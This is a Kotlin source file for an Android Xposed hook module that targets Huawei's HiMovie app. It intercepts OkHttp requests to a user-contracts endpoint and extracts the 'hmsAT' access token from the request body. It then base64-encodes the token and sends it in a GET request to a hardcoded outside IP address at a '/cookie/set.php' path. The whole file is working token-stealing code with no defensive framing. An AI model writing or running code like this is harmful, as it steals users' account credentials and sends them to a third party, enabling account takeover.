package com.example.hookmodule

import android.util.Base64
import de.robv.android.xposed.IXposedHookLoadPackage
import de.robv.android.xposed.XposedBridge
import de.robv.android.xposed.XposedHelpers
import de.robv.android.xposed.callbacks.XC_LoadPackage
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody
import okio.Buffer
import org.json.JSONObject
import java.net.URLDecoder

class MainHook : IXposedHookLoadPackage {

    private val targetPackage = "com.huawei.himovie"
    private val targetPath = "/poservice/getUserContracts"

    override fun handleLoadPackage(lpparam: XC_LoadPackage.LoadPackageParam) {

        if (lpparam.packageName != targetPackage) return

        XposedBridge.log("HiMovie Hook Loaded!")

        try {
            XposedHelpers.findAndHookMethod(
                "okhttp3.RealCall",
                lpparam.classLoader,
                "execute",
                object : de.robv.android.xposed.XC_MethodHook() {

                    override fun beforeHookedMethod(param: MethodHookParam) {

                        val req = XposedHelpers.getObjectField(param.thisObject, "originalRequest")
                        val urlObj = XposedHelpers.callMethod(req, "url").toString()

                        if (!urlObj.contains(targetPath)) return

                        XposedBridge.log("=== Intercepted API ===")
                        XposedBridge.log(urlObj)

                        val bodyObj = XposedHelpers.callMethod(req, "body") as RequestBody
                        val buffer = Buffer()
                        bodyObj.writeTo(buffer)
                        val rawBody = buffer.readUtf8()

                        XposedBridge.log("Raw body: $rawBody")

                        val queryMap = parseQuery(rawBody)
                        val dataStr = queryMap["data"] ?: return

                        val dataJson = JSONObject(dataStr)
                        val hmsAT = dataJson.getString("hmsAT")

                        val encoded = Base64.encodeToString(hmsAT.toByteArray(), Base64.NO_WRAP)
                        XposedBridge.log("hmsAT(base64): $encoded")

                        sendToServer(encoded)
                    }
                }
            )

        } catch (e: Throwable) {
            XposedBridge.log("Hook error: $e")
        }
    }

    private fun parseQuery(query: String): Map<String, String> {
        val result = mutableMapOf<String, String>()
        query.split("&").forEach {
            val parts = it.split("=")
            if (parts.size == 2) {
                result[parts[0]] = URLDecoder.decode(parts[1], "UTF-8")
            }
        }
        return result
    }

    private fun sendToServer(encoded: String) {
        try {
            val client = OkHttpClient.Builder()
                .proxy(null)
                .build()

            val url = "http://18.0.20.143:443/cookie/set.php?v=hw&t=$encoded"

            val req = Request.Builder().url(url).get().build()
            val resp = client.newCall(req).execute()

            XposedBridge.log("Server response code: ${resp.code}")
        } catch (e: Throwable) {
            XposedBridge.log("Send error: $e")
        }
    }
}
